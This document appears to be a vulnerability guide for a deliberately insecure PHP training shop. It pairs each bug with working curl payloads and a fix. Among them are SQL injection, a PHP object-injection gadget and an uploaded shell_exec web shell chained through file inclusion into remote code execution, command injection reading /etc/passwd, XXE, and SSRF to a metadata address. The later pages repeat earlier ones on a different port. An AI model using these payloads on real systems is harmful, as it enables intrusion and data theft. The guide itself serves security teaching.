# ShopEase (PHP) — Vulnerability Guide

**For authorized security testing / learning only. Run locally. Never deploy publicly or use real data.**

Same 5-page shop concept as the other editions, this time plain PHP + PDO/SQLite (classic LAMP-style, no framework) — so the PHP-specific classics show up: Local File Inclusion, Unrestricted File Upload, and PHP Object Injection, in addition to the SQLi/XSS/broken-access-control staples. Two of the bugs chain into full remote code execution, which is worth walking through end to end.

Demo accounts: `alice/alice123`, `bob/bobpass`, `admin/admin!2024`

---

## Page 1 — Login (`login.php`)
**SQL Injection (auth bypass) — CWE-89**
```
curl -X POST http://127.0.0.1:8081/login.php -d "username=admin' --&password=x"
```
**Insecure Deserialization / PHP Object Injection — CWE-502**
Checking "Remember me" sets a cookie that's just `base64(serialize($userArray))` — no HMAC, no signature. It's unserialized straight back on a later request (`includes/session_check.php`). Because `config.php` (loaded on every page) always defines a `Logger` class whose destructor does `file_put_contents($this->logFile, $this->logMsg, FILE_APPEND)` with both properties attacker-controlled, you can forge a cookie that writes an arbitrary PHP file anywhere writable the moment the request finishes:
```php
<?php
class Logger { public $logFile; public $logMsg; }
$o = new Logger();
$o->logFile = '/path/to/vulnapp-php/uploads/forged.php';
$o->logMsg  = '<?php echo shell_exec($_GET["c"]); ?>';
echo base64_encode(serialize($o));
```
```
curl --cookie "remember=<forged-value>" http://127.0.0.1:8081/login.php
curl "http://127.0.0.1:8081/admin.php?page=../uploads/forged.php&c=id"
```
**Fix:** sign tokens (HMAC) or use a random opaque token looked up server-side instead of serializing data into the cookie at all; never `unserialize()` client input (use `json_decode` instead, or `unserialize($str, ['allowed_classes' => false])` at minimum).

## Page 2 — Product search (`products.php`)
**SQL Injection (UNION-based) — CWE-89**
```
curl "http://127.0.0.1:8081/products.php?q=%27%20UNION%20SELECT%20id,username,password,email%20FROM%20users--"
```
**Fix:** `PDO::prepare()` with bound parameters, never string-interpolated SQL.

## Page 3 — Profile (`profile.php?id=`)
**IDOR — CWE-639**
No check that the logged-in session user matches `?id=`. Walk `?id=1`, `2`, `3` to read every user's SSN.
**Fix:** compare `$_SESSION['user_id']` to the requested id (or require admin role) before returning data.

## Page 4 — Product detail (`product.php?id=`)
**Stored XSS — CWE-79**
Comment body is echoed with zero escaping:
```
curl -X POST "http://127.0.0.1:8081/product.php?id=1" -d "action=comment&author=t&body=<script>alert(document.cookie)</script>"
```
**Unrestricted File Upload — CWE-434**
The "Upload a product photo" form trusts the client-supplied filename/extension outright and saves it straight into a web-reachable `uploads/` folder:
```
curl -X POST "http://127.0.0.1:8081/product.php?id=1" -F "avatar=@shell.php;filename=shell.php"
```
where `shell.php` contains e.g. `<?php echo shell_exec($_GET['c']); ?>`.
**Fix:** escape all output (`htmlspecialchars`), add a CSRF token to the comment form; for uploads, validate real content (not just the extension), re-encode images through a library, store outside the web root with a randomized name, and serve them through a controller that sets a safe `Content-Type`.

## Page 5 — Admin (`admin.php`)
**Broken access control — CWE-284**
Gated only by a client-supplied `is_admin` cookie that defaults to allow when absent — just visit the page, or set it in devtools.
**Local File Inclusion — CWE-98 / CWE-22**
```
curl "http://127.0.0.1:8081/admin.php?page=../../../../etc/passwd"
```
The real payoff is chaining this with the upload bug above — `include()` runs whatever PHP it's given, so including the uploaded shell executes it even though `uploads/` isn't meant to be a script-execution path:
```
curl "http://127.0.0.1:8081/admin.php?page=../uploads/shell.php&c=id"
# -> WEBSHELL_OK:uid=0(root) gid=0(root) ...
```
**OS command injection — CWE-78**
```
curl -X POST http://127.0.0.1:8081/admin.php -d "host=127.0.0.1; cat /etc/passwd"
```
**Fix:** real server-side role check from the session; for the page switcher, use an allowlist of known page keys mapped to fixed file paths (never pass user input to `include()`); for ping, avoid `shell_exec` string concatenation — validate the host against a strict pattern or use a library.

## Page 6 — Register (`register.php`)
**Mass assignment — CWE-915**, **User enumeration — CWE-204**, **Weak password policy / plaintext storage — CWE-521 / CWE-256**
The HTML form only has username/email/password/confirm, but the backend trusts any POST field
named `is_admin` or `ssn`, so a raw request can register as an admin directly:
```
curl -X POST http://127.0.0.1:8081/register.php \
  -d "username=evil&password=1&confirm=1&is_admin=1&ssn=111-11-1111"
```
Registering an existing username returns a distinct "already taken" message (enumerate valid
usernames), any password (even `1`) is accepted with no policy, there is no rate limiting, and the
password is stored in plaintext just like the seeded accounts.
**Fix:** allowlist writable fields (never `is_admin`), return a generic message, enforce a password
policy + hashing (`password_hash()`), add throttling/email verification.

---

## The two RCE chains, start to finish
1. **Upload → LFI:** upload `shell.php` via the product page's photo form, then hit `admin.php?page=../uploads/shell.php&c=<command>`.
2. **Object injection → LFI:** forge a `remember` cookie that writes a PHP payload via the `Logger` gadget, send one request to trigger the write, then include it the same way.

Both land on the same `admin.php?page=` sink, which is a good illustration of why *any* single critical bug (the LFI) becomes much more dangerous once *any* way to place a file on disk exists elsewhere in the app, even in an "unrelated" feature.

## Also present throughout
- Verbose SQL error messages returned to the client (CWE-209).
- Plaintext password storage (CWE-256); SSNs returned by multiple endpoints (CWE-359).
- No CSRF tokens anywhere (CWE-352).
- `uploads/` and `pages/` have no `.htaccess`/web-server hardening restricting execution or directory listing.

## Page 7 - Authentication (login.php)
**SQL Injection (Auth Bypass) — CWE-89**
```
curl -X POST http://127.0.0.1:8000/login.php -d "username=admin' --&password=anything"
```
**Weak Password Hashing — CWE-256**
Passwords are stored in plaintext. If `VULN_WEAK_PASSWORD_HASHING` is enabled, the system uses direct comparison instead of `password_verify()`.
**Fix:** Always use `password_hash()` and `password_verify()`.

## Page 8 - Products Search (products.php)
**Reflected XSS — CWE-79**
```
curl "http://127.0.0.1:8000/products.php?q=<script>alert('XSS')</script>"
```
**Fix:** Always use `htmlspecialchars()` when echoing user-controlled input.

## Page 9 - Product Reviews (product.php)
**Stored XSS — CWE-79**
```
curl -X POST http://127.0.0.1:8000/product.php?id=1 -d "comment=<script>alert('XSS')</script>"
```
**CSRF — CWE-352**
```
# Submitting a POST request without a valid CSRF token.
curl -X POST http://127.0.0.1:8000/product.php?id=1 -d "comment=Nice product!"
```
**Fix:** Implement anti-CSRF tokens for all state-changing operations and escape output for stored data.

## Page 10 - User Profile (pages/edit_user.php)
**IDOR — CWE-639**
```
curl "http://127.0.0.1:8000/admin.php?page=edit_user.php&id=1"
```
**Fix:** Verify that the currently authenticated user is authorized to perform the requested edit action.

## Page 11 - Checkout (checkout.php)
**Price/Quantity Tampering — CWE-20**
```
# Manipulating price in POST request
curl -X POST http://127.0.0.1:8000/checkout.php -d "confirm=1&price[1]=0.01"
```
**Mass Assignment — CWE-915**
```
# Injecting unauthorized order status
curl -X POST http://127.0.0.1:8000/checkout.php -d "confirm=1&status=approved"
```
**Fix:** Never trust client-submitted data for critical business logic like prices, quantities, or internal status flags. Recalculate everything server-side.

## Page 12 - Product Image Upload (product.php)
**Unrestricted File Upload — CWE-434**
```
# Uploading a PHP webshell
curl -F "avatar=@shell.php" http://127.0.0.1:8000/product.php?id=1
```
**Fix:** Validate file content (not just extension), rename files to random strings, and store outside the web root.

## Page 13 - Receipt Download (download_receipt.php)
**Path Traversal — CWE-22**
```
curl "http://127.0.0.1:8000/download_receipt.php?f=../../config.php"
```
**Fix:** Sanitize file paths using `basename()` and check that the resolved path is within the allowed directory.

## Page 14 - Admin Image Fetch (pages/fetch_remote_image.php)
**SSRF — CWE-918**
```
curl -X POST http://127.0.0.1:8000/pages/fetch_remote_image.php -d "url=http://169.254.169.254/"
```
**Fix:** Do not allow the server to fetch arbitrary URLs provided by the user. If necessary, use an allowlist of domains.

## Page 15 - Configuration (config.php)
**Information Disclosure — CWE-209**
The application displays verbose error messages if `VULN_VERBOSE_ERRORS` is enabled, potentially revealing stack traces or path information.

**Insecure Backup Files — CWE-530**
The configuration backup file (`config.php.bak`) is publicly accessible if `VULN_EXPOSED_BACKUPS` is enabled.

**Missing Security Headers — CWE-16**
If `VULN_MISSING_HEADERS` is true, the application lacks `X-Frame-Options`, `Content-Security-Policy`, and `X-Content-Type-Options`, making it susceptible to frame-based attacks like Clickjacking.

**Debug Endpoints — CWE-489**
The `debug.php` page exposes `phpinfo()` if `VULN_DEBUG_ENDPOINTS` is enabled, revealing sensitive server-side configuration.

**Fix:** Disable verbose error logging, restrict access to backup files (do not serve them via web), implement proper security headers, and remove any debug endpoints.

## Page 16 - Registration (register.php)
**Second-order SQL Injection — CWE-89**
```
# Register with a username like: admin'-- 
# Then trigger it later on an admin page that selects based on this username
```
**Fix:** Always use prepared statements for all database interactions.

## Page 17 - Request Logging (includes/log_ua.php)
**SQL Injection via HTTP Header — CWE-89**
```
# Send a request with a malicious User-Agent header
curl -H "User-Agent: ' || (SELECT ...) --" http://127.0.0.1:8000/
```
**Fix:** Use prepared statements for all database writes.

## Page 18 - Product Search (products.php)
**Blind Boolean/Time-based SQL Injection — CWE-89**
```
# Boolean
/products.php?q=a' AND 1=1--
# Time-based
/products.php?q=a' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--
```
**Fix:** Use prepared statements to prevent any SQL query alteration.

## Page 19 - Product Reviews (product.php)
**Stored XSS (Weak Blacklist) — CWE-79**
```
# Bypassing filter
curl -X POST http://127.0.0.1:8000/product.php?id=1 -d "comment=<scr<script>ipt>alert(1)</script>"
```
**Fix:** Use proper output escaping (`htmlspecialchars`) instead of blacklisting patterns.

## Page 20 - User Profile (profile.php)
**XSS via Attribute Injection — CWE-79**
```
# Injecting into an attribute context
<img src="x" onerror="alert(1)">
```
**Fix:** Ensure attribute values are properly quoted and escaped.

## Page 21 - Security Policies (header.php)
**Weak CSP — CWE-693**
If `VULN_WEAK_CSP` is enabled, the CSP header might be missing or set to `script-src 'unsafe-inline'`.
**Fix:** Implement a strong, non-inline Content Security Policy.

## Page 22 - Shopping Cart (cart.php)
**Horizontal Privilege Escalation — CWE-862**
```
# Accessing another user's cart by changing the cart_id parameter
curl "http://127.0.0.1:8000/cart.php?cart_id=1"
```
**Fix:** Validate that the authenticated session user owns the requested cart ID.

## Page 23 - Admin Panel (admin.php)
**Vertical Privilege Escalation — CWE-284**
```
# Bypassing admin check via URL quirk
curl "http://127.0.0.1:8000/admin.php/"
```
**Fix:** Normalize URLs and enforce strict, role-based access control regardless of the path formatting.

## Page 24 - Authentication (includes/session_check.php)
**Insecure "Remember Me" — CWE-384**
```
# Easily forgeable token by serializing array
php -r 'echo base64_encode(serialize(["user_id"=>1]));'
```
**Fix:** Use cryptographically secure, server-side stored opaque tokens with expiration.

## Page 25 - Checkout (checkout.php)
**Race Condition — CWE-362**
Multiple concurrent requests can lead to double-spending or stock exhaustion if the database transaction is not atomic.
**Fix:** Use database transactions (`BEGIN TRANSACTION`, `COMMIT`) and `SELECT ... FOR UPDATE` (or equivalent) to lock records.

**Workflow Bypass — CWE-472**
```
# Accessing order_success.php directly without completing checkout.php
curl http://127.0.0.1:8000/order_success.php?id=1
```
**Fix:** Validate the application state and ensure orders cannot be created or viewed without completing the preceding workflow steps.

## Page 26 - XML Import (pages/import_products.php)
**XXE Injection — CWE-611**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```
**Fix:** Disable external entity loading in XML parsers (`libxml_disable_entity_loader(true)`).

## Page 27 - Discount Application (pages/apply_discount.php)
**HTTP Parameter Pollution — CWE-235**
```
curl -X POST http://127.0.0.1:8000/pages/apply_discount.php -d "code=SUMMER20&code=WINTER50"
```
**Coupon Stacking — CWE-838**
Applying multiple discount codes to stack savings.

## Page 28 - ReDoS Validation (pages/validate_input.php)
**ReDoS — CWE-1333**
```
curl -X POST http://127.0.0.1:8000/pages/validate_input.php -d "data=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaab"
```
**Fix:** Avoid nested quantifiers and ambiguous patterns in regex.

## Page 29 - Cart Update (pages/update_cart_quantity.php)
**Integer Overflow/Negative Value — CWE-190**
```
# Send a negative quantity to result in a negative total
curl -X POST http://127.0.0.1:8000/pages/update_cart_quantity.php -d "product_id=1&quantity=-100"
```
**Fix:** Validate quantity ranges server-side.

## Page 30 - Access Control (includes/session_check.php)
**HTTP Verb Tampering — CWE-284**
```
# Bypassing admin constraints by changing GET to POST if logic only guards POST
curl -X POST http://127.0.0.1:8000/admin.php
```
**Fix:** Enforce access control rules consistently regardless of the HTTP method used.

## Page 31 - Input Validation (all pages)
**Null Byte Injection — CWE-158**
```
# Truncating a filename check
curl "http://127.0.0.1:8000/download_receipt.php?f=config.php%00.jpg"
```
**Fix:** Use modern filesystem APIs that are immune to null-byte truncation.
